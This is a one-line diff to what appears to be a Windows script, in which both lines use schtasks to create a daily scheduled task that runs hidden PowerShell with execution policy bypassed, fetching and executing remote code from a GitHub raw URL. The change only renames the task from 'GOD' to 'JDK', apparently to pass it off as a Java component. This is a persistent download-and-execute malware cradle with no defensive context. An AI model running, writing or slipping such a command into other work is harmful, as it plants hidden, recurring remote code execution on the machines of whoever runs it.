@@ -1,1 +1,1 @@
-schtasks /create /tn "GOD" /tr "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command \"Invoke-Expression (Invoke-WebRequest -UseBasicParsing -Uri 'https://raw.githubusercontent.com/AlaricGrey/z/main/i').Content\"" /sc daily /st 08:15 /f 
+schtasks /create /tn "JDK" /tr "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command \"Invoke-Expression (Invoke-WebRequest -UseBasicParsing -Uri 'https://raw.githubusercontent.com/AlaricGrey/z/main/i').Content\"" /sc daily /st 08:15 /f 
